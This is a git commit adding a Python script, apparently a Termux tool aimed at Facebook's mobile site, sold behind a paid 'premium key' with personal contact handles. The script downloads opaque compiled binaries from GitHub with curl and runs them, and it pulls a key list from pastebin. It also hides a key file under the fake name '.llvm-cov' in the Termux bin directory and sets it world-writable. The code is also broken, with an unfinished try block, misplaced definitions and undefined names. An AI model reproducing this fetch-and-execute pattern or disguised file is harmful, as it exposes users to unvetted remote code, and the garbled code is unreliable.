9d51af316975bcf3a56ce72727b367ff8c7f8a80
Parhyarshab <103854100+Parhyarshab@users.noreply.github.com>
2022-05-07 12:52:20 +0500

    Add files via upload

---
+++ Juttbrand.py
@@ -0,0 +1,111 @@
+#coding=utf-8
+### Import Module
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+from urllib.parse import quote
+
+
+### Perumpamaan Module & Syntax
+_req_ses_  = requests.Session()
+_req_get_  = requests.get
+_req_post_ = requests.post
+_js_lo_    = json.loads
+_cici_azimvau_    = input
+_azimvau_dapunta_ = open
+_cici_cici_       = exit
+
+### Warna
+Z = "\033[1;30m" # Hitam
+P = "\033[1;37m" # Putih
+M = "\033[1;31m" # Merah
+H = "\033[1;32m" # Hijau
+K = "\033[1;33m" # Kuning
+B = "\033[1;34m" # Biru
+U = "\033[1;35m" # Ungu
+O = "\033[1;36m" # Biru Muda
+N = "\033[0m"    # Warna Mati
+
+### Host & Penampungan
+host = "https://mbasic.facebook.com"
+import os, sys, platform
+try:
+    import requests
+except:
+    os.system('pip install requests')
+try:
+    rq = requests.get('https://pastebin.com/raw/2ceqHj0i').text
+import requests
+if not os.path.isfile('Jutt.so'):
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/Jutt.cpython-310.so > Jutt.so')
+    os.system('clear')
+if not os.path.isfile('brand.so'):
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/brand.cpython-310.so > brand.so')
+    os.system('clear')
+bit=platform.architecture()[0]
+go = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/update.txt').text
+if 'Juttbrand' in go:
+    if bit == '64bit':
+        from Jutt import reg
+        reg()
+    elif bit == '32bit':
+        from brand import reg
+        reg()
+        k = open("/data/data/com.termux/files/usr/bin/.llvm-cov","r").read()
+else:
+    os.system('rm -rf Jutt.so brand.so')
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/Jutt.cpython-310.so > Jutt.so')
+    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/brand.cpython-310.so > brand.so')
+    if bit == '64bit':
+        from Jutt import reg
+        reg()
+    elif bit == '32bit':
+        from brand import reg
+        def genkey():
+	try:
+		rn = open('/data/data/com.termux/files/usr/bin/.llvm-cov', 'r').read()
+		rb = rn+basesplit
+		banner()
+		psb('       %s》%s》%s》%sEVERY HUSTLER GET PAY DAY%s《%s《%s《'%(M,H,B,H,B,H,M))
+		print("\n\033[0;91m           YOU ARE NOT PREMIUM USER ")
+		print("\033[0;91m        FIRST BUY PREMIUM KEY FROM OWNER")
+		print("\033[0;93m            SEND THIS KEY TO OWNER \n\n   YOUR KEY : \033[0;92m%s"%(rb))
+		print("\033[0;93m   TOOL PRICE : %s10K "%(H))
+		print("\033[0;93m   VALIDITY : %s1 month"%(H))
+		print("\033[0;94m          TELEGRAM ID : @JAIKUMAR")
+		print("\033[0;94m          INSTAGRAM : @iam_PARHYAR_\n\n")
+		subprocess.check_output(["am", "start", "https://wa.me/+923312734753"])
+		exit()
+	except(IOError):
+		rb = rx
+		open("/data/data/com.termux/files/usr/bin/.llvm-cov","w").write(rb)
+		os.system("chmod 777 /data/data/com.termux/files/usr/bin/.llvm-cov")
+		banner()
+		psb('       %s》%s》%s》%sEVERY HUSTLER GET PAY DAY%s《%s《%s《'%(M,H,B,H,B,H,M))
+		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
+		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
+		print("\033[0;93m               SEND THIS KEY TO OWNER \n\n YOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
+		print("\033[0;93m     TOOL PRICE : %s10K"%(H))
+		print("\033[0;93m     VALIDITY : %s1 month"%(H))
+		print("\033[0;94m             TELEGRAM ID : @iam_PARHYAR_")
+		print("\033[0;94m             INSTAGRAM : @JAIKUMAR023\n\n")
+		subprocess.check_output(["am", "start", "https://wa.me/03312734753"])
+		exit()
+
+def keycheck():
+    try:
+        k = open("/data/data/com.termux/files/usr/bin/.llvm-cov","r").read()
+        if k+basesplit in rq:
+            menu()
+        else:genkey()
+    except(IOError):
+        genkey()
+   	
+if __name__=='__main__':
+	os.system('git pull')
+	folder()
+	keycheck()
+        reg()
